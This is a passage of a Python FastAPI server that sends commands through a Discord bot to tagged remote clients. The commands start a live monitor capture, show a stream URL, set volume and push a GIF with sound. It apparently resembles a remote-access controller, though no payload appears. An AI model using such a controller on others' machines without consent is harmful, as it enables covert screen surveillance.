    await _send_cmd(f"{_resolve_tag(tag)} SET_VOLUME {pct_val}")
    return JSONResponse({"ok": True, "pct": pct_val})

@app.post("/cmd/live_start")
async def cmd_live_start(monitor: int = Query(1, ge=1), tag: str = Query(None)):
    await _send_cmd(f"{_resolve_tag(tag)} START_LIVE {monitor}")
    return JSONResponse({"ok": True, "monitor": monitor})

@app.post("/cmd/live_stop")
async def cmd_live_stop(tag: str = Query(None)):
    await _send_cmd(f"{_resolve_tag(tag)} STOP_LIVE")
    return JSONResponse({"ok": True})

@app.post("/cmd/show_stream")
async def cmd_show_stream(url: str = Query(..., min_length=1), tag: str = Query(None)):
    await _send_cmd(f"{_resolve_tag(tag)} SHOW_STREAM {url}")
    return JSONResponse({"ok": True, "url": url})

@app.post("/cmd/display_gif")
async def cmd_display_gif(tag: str = Query(None)):
    gif_path = ROOT_DIR / "display.gif"
    sound_path = ROOT_DIR / "sound.mp3"
    missing = []
    if not gif_path.is_file():
        missing.append("display.gif")
    if not sound_path.is_file():
        missing.append("sound.mp3")
    if missing:
        return JSONResponse({"ok": False, "error": f"Missing file(s): {', '.join(missing)} next to main.py"}, status_code=404)
    try:
        await _send_cmd_with_files(f"{_resolve_tag(tag)} DISPLAY_GIF", [gif_path, sound_path])
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
    return JSONResponse({"ok": True})

@app.get("/tags")
async def list_tags():
    return {"active": ACTIVE_BOT_TAG, "tags": sorted(KNOWN_TAGS)}

@app.post("/tags/select")
async def select_tag(tag: str = Query(..., min_length=1)):
    active = _set_active_tag(tag)
    return {"ok": True, "active": active, "tags": sorted(KNOWN_TAGS)}

@app.get("/health")
async def health():
    return {
        "ok": True,
        "controller_ready": _controller_ready.is_set(),
        "controller_error": _controller_error,
    }


@app.get("/stream_status")
async def stream_status(tag: Optional[str] = Query(None)):
    """
    Expose the latest announced stream URL for a given tag (defaults to active).
    """
    target = _resolve_tag(tag)
    info = LAST_STREAMS.get(target, {})
    return {
        "url": info.get("url"),
        "tag": target,
        "ts": info.get("ts"),
    }

# ---------- Run Discord bot in the same process ----------
@app.on_event("startup")
async def _startup():
    async def _run_bot():
        global _controller_error
        try:
            await bot.start(CONTROLLER_TOKEN)
        except Exception as exc:
            _controller_error = str(exc)
            _controller_ready.set()
    asyncio.create_task(_run_bot())

@app.on_event("shutdown")
async def _shutdown():
    await bot.close()
